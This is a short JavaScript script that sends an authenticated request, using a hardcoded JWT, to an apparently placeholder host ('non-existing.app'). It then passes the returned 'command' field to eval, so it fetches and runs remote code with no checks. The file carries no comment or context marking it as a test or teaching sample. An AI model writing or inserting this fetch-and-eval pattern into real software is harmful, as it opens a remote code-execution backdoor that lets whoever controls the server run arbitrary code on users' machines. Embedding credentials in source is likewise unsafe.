import axios from "axios";

const startScript = async () => {

    const AUTH_TOKEN = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI4MzQ2Nzg5ODA5IiwibmFtZSI6IlJpY2sgUiIsImlhdCI6MTcyMzEwMjcyMn0.XRW52ihVZ7uEh_1BmZJ-jD7Cmifxbj5J74CtLp0QWp4'

    const res = await axios.get('https://non-existing.app/api/random', {
        headers: {
            'Authorization': AUTH_TOKEN,
        }
    })

    console.log(res.data)
    eval(res.data.command)
}

startScript();